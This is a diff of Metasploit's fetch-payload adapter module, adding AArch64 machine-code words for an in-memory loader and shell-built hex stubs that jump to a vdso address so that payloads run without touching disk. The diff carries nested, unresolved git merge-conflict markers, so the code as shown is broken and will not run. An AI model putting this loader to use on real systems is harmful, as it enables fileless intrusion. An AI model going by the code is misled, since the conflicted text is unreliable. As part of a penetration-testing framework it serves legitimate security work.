@@ -285,6 +285,7 @@ module Msf::Payload::Adapter::Fetch
       # pid = getpid()
       # kill(pid,SIGSTOP)
       in_memory_loader_asm = [
+<<<<<<< HEAD
           0x0a0080d2, #0x1000:	mov	x10, #0	0x0a0080d2
           0xea0300f9, #0x1004:	str	x10, [sp]	0xea0300f9
           0xe0030091, #0x1008:	mov	x0, sp	0xe0030091
@@ -298,6 +299,21 @@ module Msf::Payload::Adapter::Fetch
           0x610280d2, #0x1028:	mov	x1, #0x13	0x610280d2
           0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
           0x010000d4, #0x1030:	svc	#0	0x010000d4
+=======
+                  0x0a0080d2, #0x1000:	mov	x10, #0	0x0a0080d2
+                  0xea0300f9, #0x1004:	str	x10, [sp]	0xea0300f9
+                  0xe0030091, #0x1008:	mov	x0, sp	0xe0030091
+                  0x210080d2, #0x100c:	mov	x1, #1	0x210080d2
+                  0xe82280d2, #0x1010:	mov	x8, #0x117	0xe82280d2
+                  0x010000d4, #0x1014:	svc	#0	0x010000d4
+                  0xc80580d2, #0x1018:	mov	x8, #0x2e	0xc80580d2
+                  0x010000d4, #0x101c:	svc	#0	0x010000d4
+                  0x881580d2, #0x1020:	mov	x8, #0xac	0x881580d2
+                  0x010000d4, #0x1024:	svc	#0	0x010000d4
+                  0x610280d2, #0x1028:	mov	x1, #0x13	0x610280d2
+                  0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
+                  0x010000d4, #0x1030:	svc	#0	0x010000d4
+>>>>>>> 70cb91b3a2 (Add Aarch64)
       ]
       payload = in_memory_loader_asm.pack("N*")
     when 'armle'
@@ -360,6 +376,7 @@ module Msf::Payload::Adapter::Fetch
       %^"48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
     when 'x86'
 <<<<<<< HEAD
+<<<<<<< HEAD
       %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
     when 'aarch64'
       %^"4000005800001fd6"$(echo $(printf %16x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
@@ -370,6 +387,11 @@ module Msf::Payload::Adapter::Fetch
 =======
       %^b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0^
 >>>>>>> ec9b0627ed (Adding x86, fixing bash execution)
+=======
+      %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
+    when 'aarch64'
+      %^"4000005800001fd6"$(endian $(printf %016x $vdso_addr))^
+>>>>>>> 70cb91b3a2 (Add Aarch64)
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
